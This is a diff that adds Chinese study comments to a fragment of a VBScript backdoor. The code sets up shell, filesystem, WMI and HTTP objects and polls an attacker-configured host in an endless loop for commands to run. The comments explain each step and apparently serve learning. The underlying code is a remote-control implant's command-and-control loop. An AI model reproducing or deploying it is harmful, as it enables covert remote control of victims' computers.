@@ -13,16 +13,25 @@
 Option Explicit
 On Error Resume Next
 
-' Instantiate objects
+' Instantiate objects、
+' CreateObject创建一个对ActiveX对象的引用
+' 创建WScript.Shell对象
 Dim shell: Set shell = CreateObject("WScript.Shell")
+' 创建FileSystem对象
 Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
+' 获取一个wmic对象 https://docs.microsoft.com/en-us/previous-versions/tn-archive/ee198932(v=technet.10)?redirectedfrom=MSDN
+' 其实这行代码我也没太看懂
 Dim wmi: Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
+' 创建一个HTTP对象
+' HTTP对象的相关文档 https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-open
 Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+' 如果第一个HTTP对象创建不成功，则尝试创建其他的HTTP对象
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
 If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
 
 ' Initialize variables used by GET/WGET
+' 先初始化这三个变量，待会儿会用到
 Dim arrSplitUrl, strFilename, stream
 
 ' Configuration
@@ -34,16 +43,22 @@ strUrl = "http://" & strHost & ":" & strPort
 strCD =  "."
 
 ' Periodically poll for commands
+' 这个脚本采用的机制是定时轮询，查看是否有命令需要执行
 Dim strInfo
 While True
     ' Fetch next command
+    ' 通过HTTP的方式获取一条命令，第三个参数是异步选项，False表示同步，即阻塞，第一个参数为请求方式，第二个为请求的URL
+    ' 这两行代码是发送请求的标准代码
     http.Open "GET", strUrl & "/", False
     http.Send
     Dim strRawCommand
+    ' 获取响应
     strRawCommand = http.ResponseText
 
     ' Determine command and arguments
+    ' 根据接收到的字符串来判断要进行什么样的操作
     Dim arrResponseText, strCommand, strArgument
+    ' 使用空格将响应内容分割成两部分，注意第三个参数2，也就是说，不管字符串中有多少个空格，只会按照发现的第一个空格分割成两部分
     arrResponseText = Split(strRawCommand, " ", 2)
     strCommand = arrResponseText(0)
     strArgument = ""
